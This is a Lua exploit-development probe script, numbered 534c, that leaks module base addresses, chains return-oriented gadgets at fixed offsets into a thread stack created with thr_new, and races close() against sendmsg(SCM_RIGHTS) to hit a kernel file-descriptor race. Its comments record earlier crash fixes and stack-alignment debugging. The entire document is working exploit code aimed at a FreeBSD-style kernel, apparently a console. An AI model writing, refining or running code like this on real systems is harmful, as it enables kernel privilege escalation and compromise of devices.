-- CRASH_CLASS: MODERATE
-- PROBE 534c: fd-close race — correct RSP alignment
--
-- 534b crashed: RSP = chain_start - 8 (off by one qword).
-- Fix: use bare_ret as start_func. thr_new runs bare_ret which
-- does `ret` → pops [RSP] into RIP. Write chain so [RSP] is first gadget.
-- Empirically compute RSP, write chain starting there.

print("=== PROBE 534c: FD RACE V3 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_socketpair = make_syscall(135)
local sc_sendmsg = make_syscall(28)
local sc_recvmsg = make_syscall(27)
local sc_close = make_syscall(6)
local sc_nanosleep = make_syscall(240)
local sc_455 = make_syscall(455)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret = eb + uint64(0x42)
local fn_addr = lk + uint64(0xB57)

-- Socketpairs
local sv = memory.alloc(8)
zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local tx_fd = rd(sv); local rx_fd = rd(sv + 4)
print("transport: tx=" .. tx_fd .. " rx=" .. rx_fd)

zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local target_fd = rd(sv); local target_peer = rd(sv + 4)
print("target: fd=" .. target_fd .. " peer=" .. target_peer)

local shared = memory.alloc(0x100)
zero(shared, 0x100)

-- One big mmap for stack + chain
local big_size = 0x400000
local ok_big, big_base = pcall(function()
    return sc_mmap(uint64(0), uint64(big_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local big_n = to_num(big_base)

-- TCB
local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for toff = 0, 0x100, 8 do wq(tcb_page + toff, tcb_page) end
local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb_page)

-- Compute RSP from thr_new formula
-- stack_base = big_base, stack_size = half of big_size
local half = big_size / 2
local rsp_n = math.floor((big_n + half) / 16) * 16 - 8
print("big=" .. q(big_base) .. " rsp=" .. string.format("0x%X", rsp_n))

-- start_func = bare_ret → `ret` pops [RSP] into RIP, RSP += 8
-- So chain data starts at RSP. First qword at [RSP] is first gadget.
local chain_n = rsp_n
local i = 0
local function emit(v)
    wq(uint64(chain_n + i), v)
    i = i + 8
end

local ITERS = 50

-- Chain: sysarch → 50x close(target_fd) → store done → thr_exit
emit(pop_rax_ret); emit(uint64(165))  -- sysarch
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(fn_addr)

for iter = 0, ITERS - 1 do
    emit(pop_rax_ret); emit(uint64(6))
    emit(pop_rdi_ret); emit(uint64(target_fd))
    emit(fn_addr)
    if iter < 10 then
        emit(pop_rdi_ret); emit(shared + 4 + iter * 4)
        emit(mov_rdi_rax_ret)
    end
end

emit(pop_rax_ret); emit(uint64(ITERS))
emit(pop_rdi_ret); emit(shared)
emit(mov_rdi_rax_ret)

emit(pop_rax_ret); emit(uint64(431))  -- thr_exit
emit(pop_rdi_ret); emit(uint64(0))
emit(fn_addr)

print("chain: " .. i .. " bytes")

-- thr_param
local thr_param = memory.alloc(0x40)
zero(thr_param, 0x40)
wq(thr_param, bare_ret)             -- start_func = bare_ret
wq(thr_param + 8, uint64(0))        -- arg
wq(thr_param + 0x10, big_base)      -- stack_base
wq(thr_param + 0x18, uint64(half))  -- stack_size

print("[RACE] Go")

pcall(function() sc_455(uint64(thr_param), uint64(0x38)) end)

-- Main: sendmsg(SCM_RIGHTS) loop
local iov_data = memory.alloc(8); wq(iov_data, uint64(0x41))
local iov_s = memory.alloc(16); wq(iov_s, uint64(iov_data)); wq(iov_s + 8, uint64(1))
local cmsg = memory.alloc(32); zero(cmsg, 32)
wd(cmsg, 16); wd(cmsg + 4, 0xFFFF); wd(cmsg + 8, 1); wd(cmsg + 12, target_fd)
local mh = memory.alloc(64); zero(mh, 64)
wq(mh + 0x10, uint64(iov_s)); wd(mh + 0x18, 1)
wq(mh + 0x20, uint64(cmsg)); wd(mh + 0x28, 24)

local r_cmsg = memory.alloc(32)
local r_iov_d = memory.alloc(8)
local r_iov = memory.alloc(16); wq(r_iov, uint64(r_iov_d)); wq(r_iov + 8, uint64(8))
local r_mh = memory.alloc(64)

local send_ok = 0; local send_fail = 0; local anomalies = 0

for iter = 1, ITERS do
    wd(cmsg + 12, target_fd)
    local ok_s, srv = pcall(function()
        return sc_sendmsg(uint64(tx_fd), uint64(mh), uint64(0))
    end)
    local sn = ok_s and to_num(srv) or -999

    if sn >= 0 then
        send_ok = send_ok + 1
        zero(r_cmsg, 32); zero(r_mh, 64)
        wq(r_mh + 0x10, uint64(r_iov)); wd(r_mh + 0x18, 1)
        wq(r_mh + 0x20, uint64(r_cmsg)); wd(r_mh + 0x28, 32)
        pcall(function() sc_recvmsg(uint64(rx_fd), uint64(r_mh), uint64(0)) end)
        local rfd = rd(r_cmsg + 12)
        if rfd and rfd > 0 and rfd ~= target_fd then
            anomalies = anomalies + 1
            print(string.format("  *** iter %d: recv_fd=%d (exp %d) ***", iter, rfd, target_fd))
        end
        if rfd and rfd > 0 then pcall(function() sc_close(uint64(rfd)) end) end
    else
        send_fail = send_fail + 1
    end
end

local ts = memory.alloc(16); wq(ts, uint64(0)); wq(ts + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local child_done = rd(shared)
local rvs = ""
for j = 0, 9 do
    local crv = rd(shared + 4 + j * 4)
    if crv then
        if crv < 0 then crv = crv + 0x100000000 end
        rvs = rvs .. crv .. " "
    end
end

print("")
print("[RESULTS]")
print("  send: ok=" .. send_ok .. " fail=" .. send_fail .. " anomaly=" .. anomalies)
print("  child: done=" .. (child_done or "nil") .. "/" .. ITERS)
print("  child_close_rvs: " .. rvs)

pcall(function() sc_close(uint64(tx_fd)) end)
pcall(function() sc_close(uint64(rx_fd)) end)
pcall(function() sc_close(uint64(target_peer)) end)
print("=== 534c DONE ===")
